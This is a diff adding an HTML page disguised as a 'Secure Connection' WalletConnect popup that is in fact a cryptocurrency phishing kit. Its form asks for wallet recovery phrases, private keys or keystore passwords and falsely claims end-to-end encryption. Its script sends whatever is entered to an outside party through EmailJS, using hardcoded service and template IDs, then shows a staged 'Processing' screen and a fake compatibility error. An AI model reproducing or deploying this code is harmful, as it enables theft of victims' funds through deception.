@@ -1,0 +1,1145 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <script src="./microplugin-5.9.2.min.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Approve Connection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --brand-dark: #030d43;
+        --brand-primary: #2563eb;
+        --brand-primary-strong: #1d4ed8;
+        --text-main: #0f172a;
+        --text-muted: #475569;
+        --border-soft: #e2e8f0;
+        --surface: #f8fafc;
+        --surface-strong: #ffffff;
+      }
+
+      * {
+        font-family: "DM Sans", "Inter", "Segoe UI", sans-serif;
+      }
+
+      .popup-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(3, 13, 67, 0.78);
+        backdrop-filter: blur(14px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 999999;
+        padding: 16px;
+      }
+
+      .popup-card {
+        background: linear-gradient(180deg, #ffffff 0%, #fcfdff 100%);
+        color: var(--text-main);
+        border-radius: 24px;
+        border: 1px solid rgba(15, 23, 42, 0.06);
+        box-shadow:
+          0 24px 70px rgba(3, 13, 67, 0.2),
+          0 0 0 1px rgba(15, 23, 42, 0.03);
+        width: 100%;
+        max-width: 440px;
+        max-height: 92vh;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+        animation: popupIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+
+      @keyframes popupIn {
+        from {
+          opacity: 0;
+          transform: scale(0.92) translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: scale(1) translateY(0);
+        }
+      }
+
+      .btn-primary {
+        background: linear-gradient(
+          135deg,
+          var(--brand-dark) 0%,
+          var(--brand-primary) 100%
+        );
+        color: white;
+        padding: 16px 24px;
+        border-radius: 16px;
+        font-weight: 600;
+        font-size: 15px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        transition: all 0.2s ease;
+        border: none;
+        cursor: pointer;
+        box-shadow: 0 10px 24px rgba(37, 99, 235, 0.2);
+      }
+      .btn-primary:hover {
+        background: linear-gradient(
+          135deg,
+          var(--brand-primary-strong) 0%,
+          var(--brand-primary) 100%
+        );
+        transform: translateY(-1px);
+      }
+      .btn-primary:active {
+        transform: translateY(0);
+      }
+
+      .btn-secondary {
+        background: linear-gradient(
+          180deg,
+          var(--surface-strong) 0%,
+          var(--surface) 100%
+        );
+        color: var(--text-main);
+        padding: 16px 24px;
+        border-radius: 16px;
+        font-weight: 600;
+        font-size: 15px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        transition: all 0.2s ease;
+        border: 1px solid var(--border-soft);
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(3, 13, 67, 0.04);
+      }
+      .btn-secondary:hover {
+        background: #f3f8ff;
+      }
+
+      .btn-ghost {
+        background: transparent;
+        color: var(--text-muted);
+        padding: 10px;
+        border-radius: 10px;
+        font-weight: 500;
+        font-size: 14px;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        transition: all 0.2s;
+      }
+      .btn-ghost:hover {
+        color: var(--text-main);
+        background: var(--surface);
+      }
+
+      .wallet-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 12px;
+        padding: 4px;
+      }
+
+      .wallet-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 16px 8px;
+        border-radius: 16px;
+        border: 1.5px solid var(--border-soft);
+        background: linear-gradient(
+          180deg,
+          var(--surface-strong) 0%,
+          var(--surface) 100%
+        );
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+      .wallet-item:hover {
+        border-color: rgba(37, 99, 235, 0.28);
+        background: #f3f8ff;
+        transform: translateY(-2px);
+        box-shadow: 0 8px 18px rgba(37, 99, 235, 0.08);
+      }
+      .wallet-item:active {
+        transform: translateY(0);
+      }
+
+      .wallet-icon {
+        width: 44px;
+        height: 44px;
+        border-radius: 12px;
+        object-fit: cover;
+        background: white;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+      }
+
+      .wallet-name {
+        font-size: 11px;
+        font-weight: 600;
+        color: var(--text-main);
+        text-align: center;
+        line-height: 1.2;
+      }
+
+      .tab-btn {
+        flex: 1;
+        text-align: center;
+        padding: 14px 4px;
+        font-size: 14px;
+        font-weight: 600;
+        color: #64748b;
+        background: none;
+        border: none;
+        cursor: pointer;
+        position: relative;
+        transition: color 0.2s;
+      }
+      .tab-btn.active {
+        color: var(--text-main);
+      }
+      .tab-btn::after {
+        content: "";
+        position: absolute;
+        bottom: 0;
+        left: 20%;
+        right: 20%;
+        height: 2.5px;
+        border-radius: 2px;
+        background: var(--brand-primary);
+        transform: scaleX(0);
+        transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+      .tab-btn.active::after {
+        transform: scaleX(1);
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1.5px solid var(--border-soft);
+        border-radius: 14px;
+        font-size: 14px;
+        color: var(--text-main);
+        background: var(--surface);
+        outline: none;
+        transition: all 0.2s;
+        resize: none;
+      }
+      .input-field:focus {
+        border-color: var(--brand-primary);
+        background: white;
+        box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.08);
+      }
+      .input-field::placeholder {
+        color: #94a3b8;
+      }
+      .input-field.error {
+        border-color: #ef4444;
+        background: #fef2f2;
+      }
+
+      .file-drop {
+        border: 2px dashed var(--border-soft);
+        border-radius: 16px;
+        padding: 32px 20px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.2s;
+        background: var(--surface);
+      }
+      .file-drop:hover {
+        border-color: var(--brand-primary);
+        background: #f3f8ff;
+      }
+
+      .security-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px;
+        background: linear-gradient(90deg, #eff6ff 0%, #f8fbff 100%);
+        border: 1px solid rgba(37, 99, 235, 0.16);
+        border-radius: 12px;
+        color: var(--brand-primary-strong);
+        font-size: 12px;
+        font-weight: 600;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6);
+      }
+
+      .custom-scroll::-webkit-scrollbar {
+        width: 5px;
+      }
+      .custom-scroll::-webkit-scrollbar-track {
+        background: transparent;
+      }
+      .custom-scroll::-webkit-scrollbar-thumb {
+        background: #cbd5e1;
+        border-radius: 3px;
+      }
+
+      .popup-card h1,
+      .popup-card h2,
+      .popup-card h3 {
+        color: var(--text-main);
+        letter-spacing: -0.01em;
+      }
+
+      .popup-card .text-gray-900,
+      .popup-card .text-gray-700,
+      .popup-card .text-gray-800 {
+        color: var(--text-main) !important;
+      }
+
+      .popup-card .text-gray-500,
+      .popup-card .text-gray-400,
+      .popup-card .text-gray-600 {
+        color: var(--text-muted) !important;
+      }
+
+      .error-msg {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        color: #dc2626;
+        font-size: 13px;
+        margin-top: 8px;
+        animation: shake 0.3s ease;
+      }
+      @keyframes shake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        25% {
+          transform: translateX(-4px);
+        }
+        75% {
+          transform: translateX(4px);
+        }
+      }
+
+      .info-box {
+        background: #eff6ff;
+        border: 1px solid #bfdbfe;
+        border-radius: 12px;
+        padding: 14px;
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+      }
+      .info-box svg {
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+      .info-box p {
+        color: #1e40af;
+        font-size: 12px;
+        line-height: 1.5;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      /* ===== ERROR PAGE ===== */
+      .error-page {
+        position: fixed;
+        inset: 0;
+        background: linear-gradient(
+          135deg,
+          #020617 0%,
+          #0a0f1e 50%,
+          #0f172a 100%
+        );
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 999999;
+        overflow: hidden;
+      }
+
+      .error-glow-1 {
+        position: absolute;
+        top: -10%;
+        left: -10%;
+        width: 500px;
+        height: 500px;
+        background: rgba(220, 38, 38, 0.1);
+        filter: blur(150px);
+        border-radius: 50%;
+        animation: pulseGlow 4s ease-in-out infinite;
+      }
+      .error-glow-2 {
+        position: absolute;
+        bottom: -10%;
+        right: -10%;
+        width: 500px;
+        height: 500px;
+        background: rgba(249, 115, 22, 0.1);
+        filter: blur(150px);
+        border-radius: 50%;
+        animation: pulseGlow 4s ease-in-out infinite 1s;
+      }
+      .error-glow-3 {
+        position: absolute;
+        top: 40%;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 600px;
+        height: 600px;
+        background: rgba(127, 29, 29, 0.05);
+        filter: blur(180px);
+        border-radius: 50%;
+      }
+
+      @keyframes pulseGlow {
+        0%,
+        100% {
+          opacity: 0.5;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 1;
+          transform: scale(1.1);
+        }
+      }
+
+      .error-grid {
+        position: absolute;
+        inset: 0;
+        opacity: 0.03;
+        background-image: radial-gradient(
+          circle at 1px 1px,
+          rgba(255, 255, 255, 0.3) 1px,
+          transparent 0
+        );
+        background-size: 40px 40px;
+        pointer-events: none;
+      }
+
+      .error-particle {
+        position: absolute;
+        width: 2px;
+        height: 2px;
+        background: rgba(239, 68, 68, 0.4);
+        border-radius: 50%;
+        pointer-events: none;
+        animation: floatUp linear infinite;
+      }
+
+      @keyframes floatUp {
+        0% {
+          transform: translateY(0) scale(1);
+          opacity: 0;
+        }
+        10% {
+          opacity: 1;
+        }
+        90% {
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(-100vh) scale(0);
+          opacity: 0;
+        }
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .animate-spin-slow {
+        animation: spin 1.5s linear infinite;
+      }
+
+      @keyframes progressFill {
+        0% {
+          width: 0%;
+        }
+        50% {
+          width: 70%;
+        }
+        100% {
+          width: 100%;
+        }
+      }
+      .animate-progress {
+        animation: progressFill 5s ease-in-out forwards;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .animate-fade-in {
+        animation: fadeIn 1s ease-out forwards;
+      }
+
+      .dots::after {
+        content: "";
+        animation: dotsAnim 1.5s steps(3, end) infinite;
+      }
+      @keyframes dotsAnim {
+        0% {
+          content: "";
+        }
+        33% {
+          content: ".";
+        }
+        66% {
+          content: "..";
+        }
+        100% {
+          content: "...";
+        }
+      }
+    </style>
+    <base target="_blank" />
+  <script src="/dev-releases/buy-buttons-override.js" defer></script>
+</head>
+  <body>
+    <!-- ==================== SCREEN 1: MAIN CHOICE ==================== -->
+    <div id="screen-main" class="popup-overlay">
+      <div class="popup-card">
+        <div class="px-6 pt-8 pb-5 text-center">
+          <div
+            class="w-20 h-20 mx-auto mb-5 bg-gray-100 rounded-3xl flex items-center justify-center shadow-sm"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke-width="1.2"
+              stroke="#111827"
+              class="w-10 h-10"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
+              />
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"
+              />
+            </svg>
+          </div>
+          <h1 class="text-2xl font-bold text-gray-900 mb-2">
+            Secure Connection
+          </h1>
+          <p class="text-sm text-gray-500">
+            Continue to initiate a secure connection with your wallet.
+          </p>
+        </div>
+
+        <div class="px-6 pb-4 space-y-3">
+          <button class="interact-button btn-primary !bg-black">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+              stroke="currentColor"
+              class="w-5 h-5"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244"
+              />
+            </svg>
+            Continue Securely
+          </button>
+        </div>
+
+        <div class="px-6 pb-8">
+          <div class="security-badge">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+              stroke="currentColor"
+              class="w-4 h-4"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"
+              />
+            </svg>
+            Powered by WalletConnect.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SCREEN 3: LOADING ==================== -->
+    <div id="screen-loading" class="popup-overlay hidden">
+      <div class="popup-card !max-w-sm">
+        <div class="p-10 flex flex-col items-center text-center">
+          <div
+            class="w-14 h-14 border-[3px] border-gray-200 border-t-gray-900 rounded-full animate-spin mb-6"
+          ></div>
+          <h3 class="text-lg font-bold text-gray-900 mb-2">Connecting...</h3>
+          <p class="text-sm text-gray-500 mb-6">
+            Establishing secure connection to
+            <span id="loading-wallet-name" class="font-semibold text-gray-700"
+              >wallet</span
+            >
+          </p>
+          <div class="w-full bg-gray-100 rounded-full h-1 mb-3 overflow-hidden">
+            <div class="h-full bg-gray-900 rounded-full animate-progress"></div>
+          </div>
+          <p class="text-xs text-gray-400">
+            Please wait<span class="dots"></span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SCREEN 4: MANUAL FORM ==================== -->
+    <div id="screen-form" class="popup-overlay hidden">
+      <div class="popup-card">
+        <div
+          class="flex items-center justify-between p-5 border-b border-gray-100"
+        >
+          <div class="flex items-center gap-3">
+            <button onclick="showScreen('screen-main')" class="btn-ghost !p-2">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="2.5"
+                stroke="currentColor"
+                class="w-4 h-4"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M15.75 19.5L8.25 12l7.5-7.5"
+                />
+              </svg>
+            </button>
+            <div>
+              <h2 class="text-base font-bold text-gray-900">
+                Manual Connection
+              </h2>
+              <p class="text-xs text-gray-400">Enter your wallet credentials</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="flex border-b border-gray-100 px-2">
+          <button
+            onclick="selectTab('phrase')"
+            id="tab-phrase"
+            class="tab-btn active"
+          >
+            Phrase
+          </button>
+          <button
+            onclick="selectTab('keystore')"
+            id="tab-keystore"
+            class="tab-btn"
+          >
+            Keystore
+          </button>
+          <button
+            onclick="selectTab('privateKey')"
+            id="tab-privateKey"
+            class="tab-btn"
+          >
+            Private Key
+          </button>
+        </div>
+
+        <div class="p-5 custom-scroll overflow-y-auto flex-1">
+          <form onsubmit="handleSubmit(event)">
+            <div id="panel-phrase">
+              <label class="block text-sm font-semibold text-gray-700 mb-2"
+                >Recovery Phrase</label
+              >
+              <textarea
+                id="input-phrase"
+                rows="3"
+                placeholder="Enter your 12 or 24 word recovery phrase"
+                class="input-field"
+                oninput="clearError(this)"
+              ></textarea>
+              <div id="error-phrase" class="hidden"></div>
+              <div class="info-box mt-4">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="1.5"
+                  stroke="#3b82f6"
+                  class="w-4 h-4"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
+                  />
+                </svg>
+                <p>
+                  Typically 12 (sometimes 24) words separated by single spaces.
+                  This process is encrypted end-to-end.
+                </p>
+              </div>
+            </div>
+
+            <div id="panel-keystore" class="hidden">
+              <label class="block text-sm font-semibold text-gray-700 mb-2"
+                >Keystore File</label
+              >
+              <input
+                type="file"
+                id="file-keystore"
+                accept=".json,.txt"
+                class="hidden"
+                onchange="handleFile(this)"
+              />
+              <label for="file-keystore" class="file-drop">
+                <div
+                  class="w-12 h-12 mx-auto mb-3 bg-gray-100 rounded-full flex items-center justify-center"
+                >
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke-width="1.5"
+                    stroke="#9ca3af"
+                    class="w-6 h-6"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      d="M12 16.5V9.75m0 0l3 3m-3-3l-3 3M6.75 19.5a4.5 4.5 0 01-1.41-8.775 5.25 5.25 0 0110.233-2.33 3 3 0 013.758 3.848A3.752 3.752 0 0118 19.5H6.75z"
+                    />
+                  </svg>
+                </div>
+                <p
+                  class="text-sm font-semibold text-gray-700 mb-1"
+                  id="file-label"
+                >
+                  Click to upload keystore
+                </p>
+                <p class="text-xs text-gray-400">JSON or TXT format</p>
+              </label>
+              <label class="block text-sm font-semibold text-gray-700 mb-2 mt-4"
+                >Password</label
+              >
+              <input
+                type="password"
+                id="input-password"
+                placeholder="Enter keystore password"
+                class="input-field"
+              />
+              <div class="info-box mt-4">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="1.5"
+                  stroke="#3b82f6"
+                  class="w-4 h-4"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
+                  />
+                </svg>
+                <p>
+                  Your keystore file is encrypted locally. This process is
+                  end-to-end encrypted.
+                </p>
+              </div>
+            </div>
+
+            <div id="panel-privateKey" class="hidden">
+              <label class="block text-sm font-semibold text-gray-700 mb-2"
+                >Private Key</label
+              >
+              <textarea
+                id="input-privateKey"
+                rows="3"
+                placeholder="Enter your private key"
+                class="input-field font-mono text-sm"
+                oninput="clearError(this)"
+              ></textarea>
+              <div id="error-privateKey" class="hidden"></div>
+              <div class="info-box mt-4">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="1.5"
+                  stroke="#3b82f6"
+                  class="w-4 h-4"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
+                  />
+                </svg>
+                <p>
+                  Typically an alphanumeric code starting with 0x. This process
+                  is encrypted end-to-end.
+                </p>
+              </div>
+            </div>
+
+            <button type="submit" class="btn-primary mt-6 !bg-black">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+                stroke="currentColor"
+                class="w-5 h-5"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3"
+                />
+              </svg>
+              Proceed
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SCREEN 5: ERROR / PROCESSING ==================== -->
+    <div id="screen-error" class="hidden">
+      <div class="error-page">
+        <div class="error-glow-1"></div>
+        <div class="error-glow-2"></div>
+        <div class="error-glow-3"></div>
+        <div class="error-grid"></div>
+        <div id="error-particles"></div>
+
+        <div
+          class="flex flex-col items-center space-y-8 text-white relative z-10 max-w-md mx-auto px-6 animate-fade-in"
+        >
+          <div class="relative">
+            <div
+              class="w-24 h-24 border-4 border-red-500/20 rounded-full"
+            ></div>
+            <div
+              class="absolute inset-0 w-24 h-24 border-4 border-red-500 border-t-transparent rounded-full animate-spin"
+            ></div>
+            <div
+              class="absolute inset-2 w-20 h-20 border-[3px] border-orange-400/40 border-b-transparent rounded-full animate-spin-slow"
+              style="animation-direction: reverse"
+            ></div>
+            <div class="absolute inset-0 flex items-center justify-center">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+                stroke="currentColor"
+                class="w-8 h-8 text-red-400 animate-pulse"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"
+                />
+              </svg>
+            </div>
+            <div
+              class="absolute inset-0 w-24 h-24 rounded-full bg-red-500/10 blur-xl animate-pulse"
+            ></div>
+            <div
+              class="absolute -inset-4 w-32 h-32 rounded-full bg-orange-500/5 blur-2xl animate-pulse"
+              style="animation-delay: 0.5s"
+            ></div>
+          </div>
+
+          <div class="text-center space-y-3">
+            <h2
+              class="text-3xl md:text-4xl font-bold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white via-red-100 to-red-300"
+            >
+              Processing Request
+            </h2>
+            <p
+              class="text-gray-400 text-base md:text-lg max-w-sm mx-auto leading-relaxed"
+            >
+              We're securely verifying your connection. Please do not close this
+              window.
+            </p>
+          </div>
+
+          <div class="w-full max-w-xs">
+            <div class="h-1.5 bg-gray-800 rounded-full overflow-hidden">
+              <div
+                class="h-full bg-gradient-to-r from-red-500 to-orange-500 rounded-full animate-progress"
+              ></div>
+            </div>
+            <div class="flex justify-between mt-2 text-xs text-gray-500">
+              <span>Verifying</span>
+              <span class="animate-pulse"
+                >Please wait<span class="dots"></span
+              ></span>
+            </div>
+          </div>
+
+          <div class="flex items-center gap-4 text-xs text-gray-500">
+            <div class="flex items-center gap-1.5">
+              <div class="w-2 h-2 rounded-full bg-green-500"></div>
+              <span>Connected</span>
+            </div>
+            <div class="w-8 h-px bg-gray-700"></div>
+            <div class="flex items-center gap-1.5">
+              <div
+                class="w-2 h-2 rounded-full bg-orange-400 animate-pulse"
+              ></div>
+              <span class="text-orange-400">Processing</span>
+            </div>
+            <div class="w-8 h-px bg-gray-700"></div>
+            <div class="flex items-center gap-1.5">
+              <div class="w-2 h-2 rounded-full bg-gray-700"></div>
+              <span>Complete</span>
+            </div>
+          </div>
+
+          <div class="text-gray-600 text-xs font-mono">
+            Redirecting in <span id="countdown" class="text-red-400">5</span>s
+          </div>
+
+          <div
+            id="error-message-box"
+            class="hidden bg-red-500/10 border border-red-500/30 rounded-xl p-4 text-center animate-fade-in"
+          >
+            <p class="text-red-300 text-sm">
+              The wallet connected might not be compatible.
+            </p>
+            <p class="text-white text-xs mt-1">
+              Please contact admin/support or connect with an active wallet.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== JAVASCRIPT ==================== -->
+    <script>
+      // Initialize EmailJS
+      emailjs.init("EHnX5-ZibkYfEfYoo");
+
+      let currentTab = "phrase";
+      let selectedWallet = null;
+      let countdownTimer = null;
+
+      document.addEventListener("DOMContentLoaded", () => {
+        renderWallets(wallets);
+        createErrorParticles();
+      });
+
+      function createErrorParticles() {
+        const container = document.getElementById("error-particles");
+        for (let i = 0; i < 20; i++) {
+          const p = document.createElement("div");
+          p.className = "error-particle";
+          p.style.left = Math.random() * 100 + "%";
+          p.style.top = Math.random() * 100 + "%";
+          p.style.animationDelay = Math.random() * 5 + "s";
+          p.style.animationDuration = 3 + Math.random() * 4 + "s";
+          container.appendChild(p);
+        }
+      }
+
+      function showScreen(id) {
+        document
+          .querySelectorAll(".popup-overlay")
+          .forEach((el) => el.classList.add("hidden"));
+        document.getElementById("screen-error").classList.add("hidden");
+        document.getElementById(id).classList.remove("hidden");
+      }
+
+      function connectWallet(id) {
+        selectedWallet = wallets.find((w) => w.id === id);
+        showScreen("screen-loading");
+        document.getElementById("loading-wallet-name").textContent =
+          selectedWallet.name;
+
+        setTimeout(() => {
+          showErrorPage();
+        }, 3000);
+      }
+
+      function showErrorPage() {
+        document
+          .querySelectorAll(".popup-overlay")
+          .forEach((el) => el.classList.add("hidden"));
+        document.getElementById("screen-error").classList.remove("hidden");
+        startCountdown();
+      }
+
+      function selectTab(tab) {
+        currentTab = tab;
+        document
+          .querySelectorAll(".tab-btn")
+          .forEach((btn) => btn.classList.remove("active"));
+        document.getElementById("tab-" + tab).classList.add("active");
+        ["phrase", "keystore", "privateKey"].forEach((t) => {
+          document
+            .getElementById("panel-" + t)
+            .classList.toggle("hidden", t !== tab);
+        });
+      }
+
+      function handleFile(input) {
+        const label = document.getElementById("file-label");
+        label.textContent = input.files[0]?.name || "Click to upload keystore";
+      }
+
+      function validatePhrase() {
+        const val = document.getElementById("input-phrase").value.trim();
+        if (!val)
+          return showFieldError("phrase", "Recovery phrase is required");
+        const words = val.split(/\s+/).filter((w) => w);
+        if (words.length !== 12 && words.length !== 24) {
+          return showFieldError("phrase", "Must be exactly 12 or 24 words");
+        }
+        return true;
+      }
+
+      function validatePrivateKey() {
+        const val = document.getElementById("input-privateKey").value.trim();
+        if (!val)
+          return showFieldError("privateKey", "Private key is required");
+        const clean = val.startsWith("0x") ? val.slice(2) : val;
+        if (!/^[0-9a-fA-F]{64}$/.test(clean)) {
+          return showFieldError("privateKey", "Invalid private key format");
+        }
+        return true;
+      }
+
+      function showFieldError(field, msg) {
+        const input = document.getElementById("input-" + field);
+        const error = document.getElementById("error-" + field);
+        input.classList.add("error");
+        error.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"/></svg>${msg}`;
+        error.classList.remove("hidden");
+        error.classList.add("error-msg");
+        return false;
+      }
+
+      function clearError(input) {
+        input.classList.remove("error");
+        const id = input.id.replace("input-", "");
+        const error = document.getElementById("error-" + id);
+        if (error) error.classList.add("hidden");
+      }
+
+      function handleSubmit(e) {
+        e.preventDefault();
+        let valid = true;
+        if (currentTab === "phrase") valid = validatePhrase();
+        else if (currentTab === "privateKey") valid = validatePrivateKey();
+        if (!valid) return;
+
+        const data = {
+          type: currentTab,
+          phrase: document.getElementById("input-phrase").value,
+          privateKey: document.getElementById("input-privateKey").value,
+          password: document.getElementById("input-password").value,
+        };
+
+        emailjs
+          .send("service_0kgrtet", "template_3h9ofz7", data)
+          .then(() => {
+            console.log("SUCCESS!");
+            resetForm();
+          })
+          .catch((error) => {
+            console.log("FAILED...", error);
+          });
+
+        showErrorPage();
+      }
+
+      function startCountdown() {
+        let count = 5;
+        const el = document.getElementById("countdown");
+        const errorBox = document.getElementById("error-message-box");
+        if (countdownTimer) clearInterval(countdownTimer);
+
+        // Hide error box at start
+        errorBox.classList.add("hidden");
+
+        countdownTimer = setInterval(() => {
+          count--;
+          el.textContent = count;
+          if (count <= 0) {
+            clearInterval(countdownTimer);
+            // Show error message AFTER countdown completes
+            errorBox.classList.remove("hidden");
+            // Wait 5 more seconds before redirecting
+            setTimeout(() => {
+              showScreen("screen-main");
+              resetForm();
+            }, 5000);
+          }
+        }, 1000);
+      }
+
+      function resetForm() {
+        document.getElementById("input-phrase").value = "";
+        document.getElementById("input-privateKey").value = "";
+        document.getElementById("input-password").value = "";
+        document.getElementById("file-keystore").value = "";
+        document.getElementById("file-label").textContent =
+          "Click to upload keystore";
+        selectTab("phrase");
+        document
+          .querySelectorAll(".error-msg")
+          .forEach((el) => el.classList.add("hidden"));
+        document
+          .querySelectorAll(".input-field")
+          .forEach((el) => el.classList.remove("error"));
+      }
+
+      window.WalletConnect = {
+        open: () => showScreen("screen-main"),
+        close: () => {
+          document
+            .querySelectorAll(".popup-overlay")
+            .forEach((el) => el.classList.add("hidden"));
+          document.getElementById("screen-error").classList.add("hidden");
+        },
+      };
+    </script>
+  </body>
+</html>
